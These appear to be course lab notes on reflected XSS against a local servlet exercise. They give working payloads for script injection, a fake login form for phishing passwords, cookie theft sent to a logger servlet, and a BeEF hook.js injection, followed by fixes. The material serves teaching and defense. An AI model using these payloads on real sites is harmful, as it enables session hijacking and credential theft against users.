Reflected Cross-Site Scripting
---------------------------------------------------------------------

URL: http://localhost:8080/Servlet-XSS-Exercise/index.html
		 

How to attack an input field?
---------------------------------------------------------------------

a) Use FireBug to change the maxlength attribute of the input field
	username (becuase username will be embedded in the response page).	

b) Enter <script>alert('XSS');</script> as the username and submit.


How to attack a hidden field?
---------------------------------------------------------------------
a) Use FireBug to change the value of the hidden field named role to:
	<script>alert('XSS');</script>

b) Fill in some more user data and submit.


How to trick the user to enter the password?
---------------------------------------------------------------------
HTML Injection: Deploy the ServletLogger application and enter the
following HTML code as "username":

<br><form method="post" action="/Servlet-Logger/controller">
Login: <input type="text" name="username"><br>
Password: <input type="password" name="password"><br>
<input type="submit" value="Submit" />
</form>


How to steal cookies?
---------------------------------------------------------------------

a) Deploy Servlet-Logger

b) Displaying cookies
	<script>alert(document.cookie);</script>

c) Stealing cookies
	<script>document.location="http://localhost:8080/Servlet-Logger/controller?cookie="+document.cookie+"&location="+document.location;</script>

Note that this attack can also be used to steal session ids!!


How to hook into the BeEF framework?
---------------------------------------------------------------------
https://beefproject.com/

o) BeEF Setup (Kali 2020.2+)
	$ sudo apt-get update
	$ sudo apt-get install beef-xss

o) Start the BeEF server (using a Kali VM) -> ifconfig -> 10.0.2.15

o) Inject the following JavaScript code:
    <script src="http://10.0.2.4:3000/hook.js"></script>

o) Open the BeEF Panel in a browser:
    http://10.0.2.4:3000/ui/panel

Note that this is only working if the Web application is using HTTP.
With HTTPS we run into a Mixed content error => browser will block
loading mixed active content.

    BeEF Login: beef/feeb

    BeEF Commands:
        - Raw JavaScript
        - Create Alert Dialog
        - Redirect


How to fix these vulnerabilities?
---------------------------------------------------------------------

i) Set the cookie flags: HttpOnly, Secure

ii) HTTP Encoding for userdata within the HTML page

iii) Configure web.xml to use HTTPS

    <security-constraint>
		<web-resource-collection>
			<web-resource-name>secure</web-resource-name>
			<url-pattern>/*</url-pattern>
		</web-resource-collection>
		<user-data-constraint>
			<transport-guarantee>CONFIDENTIAL</transport-guarantee>
		</user-data-constraint>
	</security-constraint>
